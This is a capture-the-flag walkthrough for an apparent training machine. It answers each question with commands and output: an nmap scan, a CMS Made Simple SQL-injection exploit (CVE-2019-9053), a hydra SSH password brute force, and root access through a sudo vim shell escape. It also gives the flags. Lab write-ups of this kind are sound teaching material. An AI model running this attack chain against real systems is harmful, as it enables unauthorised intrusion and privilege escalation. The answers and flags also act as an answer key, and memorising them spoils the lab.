1. How many services are running under port 1000?
nmap -sV {MACHINE-IP}

#PORT     STATE SERVICE REASON         VERSION
#21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
#80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
#2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

2. What is running on the higher port?
ssh

3. What's the CVE you're using against the application?
At http://{MACHINE-IP}/simple/ =, we see CMS Made Simple version 2.2.8
Interminal, searchsploit cms made 2.2.8
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
=> CVE-2019-9053

4. To what kind of vulnerability is the application vulnerable?
sqli

5. What's the password?
python3 46635.py -u http:/{MACHINE-IP}/simple/ -w /path/to/rockyou.txt -c
#salt = 1dac0d92e9fa6bb2
#username = mitch
#email = admin@admin.com

hydra -l mitch -P /path/to/rockyou.txt ssh://{MACHINE_IP}:2222
#[2222][ssh] host: {MACHINE_IP}   login: mitch   password: secret
 6. Where can you login with the details obtained?
 ssh
 
 7. What's the user flag?
 cat user.txt
 #G00d j0b, keep up!
 
 8. Is there any other user in the home directory? What's its name?
 ls ../
 #mitch sunbath
 
 9. What can you leverage to spawn a privileged shell?
 sudo -l
 #User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
 => vim
 
 10. What's the root flag?
 sudo vim -c ':!/bin/sh'
 #ls root/
 #root.txt
 #cat root.txt
 W3ll d0n3. You made it!
 
 __DONE__
